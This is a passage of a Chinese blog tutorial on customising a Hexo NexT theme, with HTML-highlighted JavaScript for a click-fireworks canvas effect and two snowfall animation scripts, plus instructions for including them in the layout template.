class="hljs-number">180</span>,a=anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">50</span>,<span class="hljs-number">180</span>),n=[-<span class="hljs-number">1</span>,<span class="hljs-number">1</span>][anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)]*a;<span class="hljs-keyword">return</span>&#123;<span class="hljs-attr">x</span>:e.<span class="hljs-property">x</span>+n*<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">cos</span>(t),<span class="hljs-attr">y</span>:e.<span class="hljs-property">y</span>+n*<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sin</span>(t)&#125;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">createParticule</span>(<span class="hljs-params">e,t</span>)&#123;<span class="hljs-keyword">var</span> a=&#123;&#125;;<span class="hljs-keyword">return</span> a.<span class="hljs-property">x</span>=e,a.<span class="hljs-property">y</span>=t,a.<span class="hljs-property">color</span>=colors[anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">0</span>,colors.<span class="hljs-property">length</span>-<span class="hljs-number">1</span>)],a.<span class="hljs-property">radius</span>=anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">16</span>,<span class="hljs-number">32</span>),a.<span class="hljs-property">endPos</span>=<span class="hljs-title function_">setParticuleDirection</span>(a),a.<span class="hljs-property">draw</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;ctx.<span class="hljs-title function_">beginPath</span>(),ctx.<span class="hljs-title function_">arc</span>(a.<span class="hljs-property">x</span>,a.<span class="hljs-property">y</span>,a.<span class="hljs-property">radius</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>,!<span class="hljs-number">0</span>),ctx.<span class="hljs-property">fillStyle</span>=a.<span class="hljs-property">color</span>,ctx.<span class="hljs-title function_">fill</span>()&#125;,a&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">createCircle</span>(<span class="hljs-params">e,t</span>)&#123;<span class="hljs-keyword">var</span> a=&#123;&#125;;<span class="hljs-keyword">return</span> a.<span class="hljs-property">x</span>=e,a.<span class="hljs-property">y</span>=t,a.<span class="hljs-property">color</span>=<span class="hljs-string">&quot;#F00&quot;</span>,a.<span class="hljs-property">radius</span>=<span class="hljs-number">0.1</span>,a.<span class="hljs-property">alpha</span>=<span class="hljs-number">0.5</span>,a.<span class="hljs-property">lineWidth</span>=<span class="hljs-number">6</span>,a.<span class="hljs-property">draw</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;ctx.<span class="hljs-property">globalAlpha</span>=a.<span class="hljs-property">alpha</span>,ctx.<span class="hljs-title function_">beginPath</span>(),ctx.<span class="hljs-title function_">arc</span>(a.<span class="hljs-property">x</span>,a.<span class="hljs-property">y</span>,a.<span class="hljs-property">radius</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>,!<span class="hljs-number">0</span>),ctx.<span class="hljs-property">lineWidth</span>=a.<span class="hljs-property">lineWidth</span>,ctx.<span class="hljs-property">strokeStyle</span>=a.<span class="hljs-property">color</span>,ctx.<span class="hljs-title function_">stroke</span>(),ctx.<span class="hljs-property">globalAlpha</span>=<span class="hljs-number">1</span>&#125;,a&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">renderParticule</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> t=<span class="hljs-number">0</span>;t&lt;e.<span class="hljs-property">animatables</span>.<span class="hljs-property">length</span>;t++)&#123;e.<span class="hljs-property">animatables</span>[t].<span class="hljs-property">target</span>.<span class="hljs-title function_">draw</span>()&#125;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">animateParticules</span>(<span class="hljs-params">e,t</span>)&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> a=<span class="hljs-title function_">createCircle</span>(e,t),n=[],i=<span class="hljs-number">0</span>;i&lt;numberOfParticules;i++)&#123;n.<span class="hljs-title function_">push</span>(<span class="hljs-title function_">createParticule</span>(e,t))&#125;anime.<span class="hljs-title function_">timeline</span>().<span class="hljs-title function_">add</span>(&#123;<span class="hljs-attr">targets</span>:n,<span class="hljs-attr">x</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">return</span> e.<span class="hljs-property">endPos</span>.<span class="hljs-property">x</span>&#125;,<span class="hljs-attr">y</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">return</span> e.<span class="hljs-property">endPos</span>.<span class="hljs-property">y</span>&#125;,<span class="hljs-attr">radius</span>:<span class="hljs-number">0.1</span>,<span class="hljs-attr">duration</span>:anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">1200</span>,<span class="hljs-number">1800</span>),<span class="hljs-attr">easing</span>:<span class="hljs-string">&quot;easeOutExpo&quot;</span>,<span class="hljs-attr">update</span>:renderParticule&#125;).<span class="hljs-title function_">add</span>(&#123;<span class="hljs-attr">targets</span>:a,<span class="hljs-attr">radius</span>:anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">80</span>,<span class="hljs-number">160</span>),<span class="hljs-attr">lineWidth</span>:<span class="hljs-number">0</span>,<span class="hljs-attr">alpha</span>:&#123;<span class="hljs-attr">value</span>:<span class="hljs-number">0</span>,<span class="hljs-attr">easing</span>:<span class="hljs-string">&quot;linear&quot;</span>,<span class="hljs-attr">duration</span>:anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">600</span>,<span class="hljs-number">800</span>)&#125;,<span class="hljs-attr">duration</span>:anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">1200</span>,<span class="hljs-number">1800</span>),<span class="hljs-attr">easing</span>:<span class="hljs-string">&quot;easeOutExpo&quot;</span>,<span class="hljs-attr">update</span>:renderParticule,<span class="hljs-attr">offset</span>:<span class="hljs-number">0</span>&#125;)&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">e,t</span>)&#123;<span class="hljs-keyword">var</span> a;<span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">var</span> n=<span class="hljs-variable language_">this</span>,i=<span class="hljs-variable language_">arguments</span>;<span class="hljs-built_in">clearTimeout</span>(a),a=<span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;e.<span class="hljs-title function_">apply</span>(n,i)&#125;,t)&#125;&#125;<span class="hljs-keyword">var</span> canvasEl=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;.fireworks&quot;</span>);<span class="hljs-keyword">if</span>(canvasEl)&#123;<span class="hljs-keyword">var</span> ctx=canvasEl.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">&quot;2d&quot;</span>),numberOfParticules=<span class="hljs-number">30</span>,pointerX=<span class="hljs-number">0</span>,pointerY=<span class="hljs-number">0</span>,tap=<span class="hljs-string">&quot;mousedown&quot;</span>,colors=[<span class="hljs-string">&quot;#FF1461&quot;</span>,<span class="hljs-string">&quot;#18FF92&quot;</span>,<span class="hljs-string">&quot;#5A87FF&quot;</span>,<span class="hljs-string">&quot;#FBF38C&quot;</span>],setCanvasSize=<span class="hljs-title function_">debounce</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;canvasEl.<span class="hljs-property">width</span>=<span class="hljs-number">2</span>*<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>,canvasEl.<span class="hljs-property">height</span>=<span class="hljs-number">2</span>*<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>,canvasEl.<span class="hljs-property">style</span>.<span class="hljs-property">width</span>=<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>+<span class="hljs-string">&quot;px&quot;</span>,canvasEl.<span class="hljs-property">style</span>.<span class="hljs-property">height</span>=<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>+<span class="hljs-string">&quot;px&quot;</span>,canvasEl.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">&quot;2d&quot;</span>).<span class="hljs-title function_">scale</span>(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)&#125;,<span class="hljs-number">500</span>),render=<span class="hljs-title function_">anime</span>(&#123;<span class="hljs-attr">duration</span>:<span class="hljs-number">1</span>/<span class="hljs-number">0</span>,<span class="hljs-attr">update</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;ctx.<span class="hljs-title function_">clearRect</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,canvasEl.<span class="hljs-property">width</span>,canvasEl.<span class="hljs-property">height</span>)&#125;&#125;);<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(tap,<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-string">&quot;sidebar&quot;</span>!==e.<span class="hljs-property">target</span>.<span class="hljs-property">id</span>&amp;&amp;<span class="hljs-string">&quot;toggle-sidebar&quot;</span>!==e.<span class="hljs-property">target</span>.<span class="hljs-property">id</span>&amp;&amp;<span class="hljs-string">&quot;A&quot;</span>!==e.<span class="hljs-property">target</span>.<span class="hljs-property">nodeName</span>&amp;&amp;<span class="hljs-string">&quot;IMG&quot;</span>!==e.<span class="hljs-property">target</span>.<span class="hljs-property">nodeName</span>&amp;&amp;(render.<span class="hljs-title function_">play</span>(),<span class="hljs-title function_">updateCoords</span>(e),<span class="hljs-title function_">animateParticules</span>(pointerX,pointerY))&#125;,!<span class="hljs-number">1</span>),<span class="hljs-title function_">setCanvasSize</span>(),<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;resize&quot;</span>,setCanvasSize,!<span class="hljs-number">1</span>)&#125;;<br></code></pre></td></tr></table></figure><p>添加代码于**_layout.swig**末尾。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--单击烟花效果--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fireworks&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/fireworks.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="二、背景添加小动画"><a href="#二、背景添加小动画" class="headerlink" title="二、背景添加小动画"></a>二、背景添加小动画</h1><h2 id="1-官方小动画"><a href="#1-官方小动画" class="headerlink" title="1.官方小动画"></a>1.官方小动画</h2><p>其实官方就已经有背景小动画了，给了四种，在config里可设置。</p><p><img src="https://i.loli.net/2019/08/08/OG7jmAxvrISgs42.jpg" alt="screenshot.2.jpg"></p><p>其他几种对于我来说真的太花了，于是选择了第一种。</p><h2 id="2-飘雪动画"><a href="#2-飘雪动画" class="headerlink" title="2.飘雪动画"></a>2.飘雪动画</h2><p>在<strong>\themes\next\source\js</strong>下新建<strong>snow.js</strong>文件。</p><p>有两种样式，看喜好取舍（个人偏好样式2）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/*样式一*/</span><br>(<span class="hljs-keyword">function</span>(<span class="hljs-params">$</span>)&#123;<br>$.fn.<span class="hljs-property">snow</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">options</span>)&#123;<br><span class="hljs-keyword">var</span> $flake = $(<span class="hljs-string">&#x27;&lt;div id=&quot;snowbox&quot; /&gt;&#x27;</span>).<span class="hljs-title function_">css</span>(&#123;<span class="hljs-string">&#x27;position&#x27;</span>: <span class="hljs-string">&#x27;absolute&#x27;</span>,<span class="hljs-string">&#x27;z-index&#x27;</span>:<span class="hljs-string">&#x27;9999&#x27;</span>, <span class="hljs-string">&#x27;top&#x27;</span>: <span class="hljs-string">&#x27;-50px&#x27;</span>&#125;).<span class="hljs-title function_">html</span>(<span class="hljs-string">&#x27;&amp;#10052;&#x27;</span>),<br>documentHeight = $(<span class="hljs-variable language_">document</span>).<span class="hljs-title function_">height</span>(),<br>documentWidth= $(<span class="hljs-variable language_">document</span>).<span class="hljs-title function_">width</span>(),<br>defaults = &#123;<br>minSize: <span class="hljs-number">10</span>,<br>maxSize: <span class="hljs-number">20</span>,<br>newOn: <span class="hljs-number">1000</span>,<br>flakeColor: <span class="hljs-string">&quot;#AFDAEF&quot;</span> <span class="hljs-comment">/* 此处可以定义雪花颜色，若要白色可以改为#FFFFFF */</span><br>&#125;,<br>options= $.<span class="hljs-title function_">extend</span>(&#123;&#125;, defaults, options);<br><span class="hljs-keyword">var</span> interval= <span class="hljs-built_in">setInterval</span>( <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">var</span> startPositionLeft = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * documentWidth - <span class="hljs-number">100</span>,<br>startOpacity = <span class="hljs-number">0.5</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>(),<br>sizeFlake = options.<span class="hljs-property">minSize</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * options.<span class="hljs-property">maxSize</span>,<br>endPositionTop = documentHeight - <span class="hljs-number">200</span>,<br>endPositionLeft = startPositionLeft - <span class="hljs-number">500</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">500</span>,<br>durationFall = documentHeight * <span class="hljs-number">10</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">5000</span>;<br>$flake.<span class="hljs-title function_">clone</span>().<span class="hljs-title function_">appendTo</span>(<span class="hljs-string">&#x27;body&#x27;</span>).<span class="hljs-title function_">css</span>(&#123;<br><span class="hljs-attr">left</span>: startPositionLeft,<br><span class="hljs-attr">opacity</span>: startOpacity,<br><span class="hljs-string">&#x27;font-size&#x27;</span>: sizeFlake,<br><span class="hljs-attr">color</span>: options.<span class="hljs-property">flakeColor</span><br>&#125;).<span class="hljs-title function_">animate</span>(&#123;<br><span class="hljs-attr">top</span>: endPositionTop,<br><span class="hljs-attr">left</span>: endPositionLeft,<br><span class="hljs-attr">opacity</span>: <span class="hljs-number">0.2</span><br>&#125;,durationFall,<span class="hljs-string">&#x27;linear&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>$(<span class="hljs-variable language_">this</span>).<span class="hljs-title function_">remove</span>()<br>&#125;);<br>&#125;, options.<span class="hljs-property">newOn</span>);<br>    &#125;;<br>&#125;)(jQuery);<br>$(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    $.fn.<span class="hljs-title function_">snow</span>(&#123; <br>    <span class="hljs-attr">minSize</span>: <span class="hljs-number">5</span>, <span class="hljs-comment">/* 定义雪花最小尺寸 */</span><br>    <span class="hljs-attr">maxSize</span>: <span class="hljs-number">50</span>,<span class="hljs-comment">/* 定义雪花最大尺寸 */</span><br>    <span class="hljs-attr">newOn</span>: <span class="hljs-number">300</span>  <span class="hljs-comment">/* 定义密集程度，数字越小越密集 */</span><br>    &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/*样式二*/</span><br><span class="hljs-comment">/* 控制下雪 */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">snowFall</span>(<span class="hljs-params">snow</span>) &#123;<br>    <span class="hljs-comment">/* 可配置属性 */</span><br>    snow = snow || &#123;&#125;;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxFlake</span> = snow.<span class="hljs-property">maxFlake</span> || <span class="hljs-number">200</span>;   <span class="hljs-comment">/* 最多片数 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">flakeSize</span> = snow.<span class="hljs-property">flakeSize</span> || <span class="hljs-number">10</span>;  <span class="hljs-comment">/* 雪花形状 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fallSpeed</span> = snow.<span class="hljs-property">fallSpeed</span> || <span class="hljs-number">1</span>;   <span class="hljs-comment">/* 坠落速度 */</span><br>&#125;<br><span class="hljs-comment">/* 兼容写法 */</span><br>requestAnimationFrame = <span class="hljs-variable language_">window</span>.<span class="hljs-property">requestAnimationFrame</span> ||<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">mozRequestAnimationFrame</span> ||<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">webkitRequestAnimationFrame</span> ||<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">msRequestAnimationFrame</span> ||<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">oRequestAnimationFrame</span> ||<br>    <span class="hljs-keyword">function</span>(<span class="hljs-params">callback</span>) &#123; <span class="hljs-built_in">setTimeout</span>(callback, <span class="hljs-number">1000</span> / <span class="hljs-number">60</span>); &#125;;<br><br>cancelAnimationFrame = <span class="hljs-variable language_">window</span>.<span class="hljs-property">cancelAnimationFrame</span> ||<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">mozCancelAnimationFrame</span> ||<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">webkitCancelAnimationFrame</span> ||<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">msCancelAnimationFrame</span> ||<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">oCancelAnimationFrame</span>;<br><span class="hljs-comment">/* 开始下雪 */</span><br>snowFall.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">start</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-comment">/* 创建画布 */</span><br>    snowCanvas.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>);<br>    <span class="hljs-comment">/* 创建雪花形状 */</span><br>    createFlakes.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>);<br>    <span class="hljs-comment">/* 画雪 */</span><br>    drawSnow.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>)<br>&#125;<br><span class="hljs-comment">/* 创建画布 */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">snowCanvas</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">/* 添加Dom结点 */</span><br>    <span class="hljs-keyword">var</span> snowcanvas = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;canvas&quot;</span>);<br>    snowcanvas.<span class="hljs-property">id</span> = <span class="hljs-string">&quot;snowfall&quot;</span>;<br>    snowcanvas.<span class="hljs-property">width</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>;<br>    snowcanvas.<span class="hljs-property">height</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">clientHeight</span>;<br>    snowcanvas.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;style&quot;</span>, <span class="hljs-string">&quot;position:absolute; top: 0; left: 0; z-index: 1; pointer-events: none;&quot;</span>);<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;body&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">appendChild</span>(snowcanvas);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span> = snowcanvas;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span> = snowcanvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">&quot;2d&quot;</span>);<br>    <span class="hljs-comment">/* 窗口大小改变的处理 */</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">onresize</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        snowcanvas.<span class="hljs-property">width</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>;<br>        <span class="hljs-comment">/* snowcanvas.height = window.innerHeight */</span><br>    &#125;<br>&#125;<br><span class="hljs-comment">/* 雪运动对象 */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">flakeMove</span>(<span class="hljs-params">canvasWidth, canvasHeight, flakeSize, fallSpeed</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * canvasWidth);   <span class="hljs-comment">/* x坐标 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * canvasHeight);  <span class="hljs-comment">/* y坐标 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * flakeSize + <span class="hljs-number">2</span>;          <span class="hljs-comment">/* 形状 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxSize</span> = flakeSize;                           <span class="hljs-comment">/* 最大形状 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">speed</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">1</span> + fallSpeed;         <span class="hljs-comment">/* 坠落速度 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fallSpeed</span> = fallSpeed;                         <span class="hljs-comment">/* 坠落速度 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">speed</span>;                             <span class="hljs-comment">/* Y方向速度 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span> = <span class="hljs-number">0</span>;                                      <span class="hljs-comment">/* X方向速度 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">stepSize</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() / <span class="hljs-number">30</span>;                 <span class="hljs-comment">/* 步长 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">step</span> = <span class="hljs-number">0</span>                                       <span class="hljs-comment">/* 步数 */</span><br>&#125;<br>flakeMove.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">update</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> x = <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>,<br>        y = <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span>;<br>    <span class="hljs-comment">/* 左右摆动(余弦) */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span> *= <span class="hljs-number">0.98</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span> &lt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">speed</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">speed</span><br>    &#125;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span> += <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">cos</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">step</span> += <span class="hljs-number">.05</span>) * <span class="hljs-variable language_">this</span>.<span class="hljs-property">stepSize</span>;<br><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> += <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> += <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span>;<br>    <span class="hljs-comment">/* 飞出边界的处理 */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> &gt;= canvas.<span class="hljs-property">width</span> || <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> &lt;= <span class="hljs-number">0</span> || <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> &gt;= canvas.<span class="hljs-property">height</span> || <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> &lt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">reset</span>(canvas.<span class="hljs-property">width</span>, canvas.<span class="hljs-property">height</span>)<br>    &#125;<br>&#125;;<br><span class="hljs-comment">/* 飞出边界-放置最顶端继续坠落 */</span><br>flakeMove.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">reset</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">width, height</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span 